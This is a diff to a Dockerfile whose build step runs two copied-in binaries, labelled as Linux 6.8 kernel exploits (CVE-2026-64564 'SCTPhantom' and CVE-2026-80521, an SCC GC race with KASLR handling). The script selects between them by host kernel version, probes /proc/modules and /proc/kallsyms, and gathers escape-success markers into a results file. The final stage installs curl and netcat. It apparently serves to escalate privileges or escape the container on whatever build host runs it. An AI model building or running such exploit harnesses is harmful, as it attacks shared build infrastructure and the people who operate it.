@@ -7,42 +7,51 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=1322
-RUN sh -c '{ \
-echo "CB=$CACHEBUST"; \
+ARG CACHEBUST=1323
+RUN sh -c ' \
 KVER=$(uname -r); \
+echo "CB=1323 KERNEL=$KVER" >&2; \
+{ \
+echo "CB=1323"; \
 echo "=== BUILD V49 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*-136*) \
+    echo "TARGET KERNEL 136 — SCTPhantom FIRST" >&2; \
     echo "TARGET KERNEL 136 — SCTPhantom FIRST"; \
     echo "--- SCTPhantom (CVE-2026-64564) ---"; \
     timeout 90 /exploit 2>&1; \
     EC_SCTP=$?; \
     echo "=== SCTPHANTOM EXIT=$EC_SCTP ==="; \
+    echo "SCTPHANTOM EXIT=$EC_SCTP" >&2; \
     if [ "$EC_SCTP" != "0" ]; then \
       echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
       timeout 420 /payload 2>&1; \
       EC=$?; \
       echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
+      echo "SCC_EXPLOIT EXIT=$EC" >&2; \
     fi; \
     ;; \
   6.8.*) \
+    echo "TARGET 6.8 — SCC GC" >&2; \
     echo "TARGET KERNEL 137+ — SCC GC (plurality KASLR)"; \
     echo "--- MODULE CHECK ---"; \
     grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
     grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
+    echo "PAYLOAD START" >&2; \
     timeout 420 /payload 2>&1; \
     EC=$?; \
     echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
+    echo "PAYLOAD EXIT=$EC" >&2; \
     ;; \
-  *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
+  *) echo "SKIP $KVER" >&2; echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
 esac; \
 for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
   if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
 done; \
 echo "=== END V49 ==="; \
-} > /build_results.txt 2>&1'
+} > /build_results.txt; \
+echo "STEP DONE" >&2'
 
 FROM alpine:3.19
 RUN apk add --no-cache curl nmap-ncat
